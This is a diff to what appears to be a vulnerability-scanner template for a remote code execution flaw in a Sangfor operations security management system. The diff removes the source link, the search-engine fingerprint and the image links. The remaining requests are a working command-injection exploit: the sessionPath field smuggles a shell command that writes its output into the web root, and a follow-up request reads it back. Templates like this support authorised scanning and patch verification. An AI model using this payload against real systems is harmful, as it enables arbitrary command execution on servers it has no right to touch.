@@ -3,12 +3,8 @@ info:
   name: 深信服运维安全管理系统 getHis 远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/se5bh5g5k4kk4xb4'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: se5bh5g5k4kk4xb4
-    fofa: body="/fort/login" && header="FORTSESSIONID"
 http:
 - raw:
   - 'POST /isomp-protocol/protocol/getHis HTTP/1.1
@@ -24,18 +20,14 @@ http:
     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
 
 
-    sessionPath=;id>/usr/local/tomcat/webapps/isomp-protocol/okm.txt;&sid=1
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1769350883618-dfcc4450-465c-485a-ae6e-d4283eb18966.png)'
+    sessionPath=;id>/usr/local/tomcat/webapps/isomp-protocol/okm.txt;&sid=1'
   redirects: false
   matchers:
   - status:
     - 200
     type: status
 - raw:
-  - 'GET /isomp-protocol/okm.txt HTTP/1.1
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1769350883947-6922faad-2994-4ace-98e1-73dd78383f5b.png)'
+  - GET /isomp-protocol/okm.txt HTTP/1.1
   redirects: false
   matchers:
   - status:
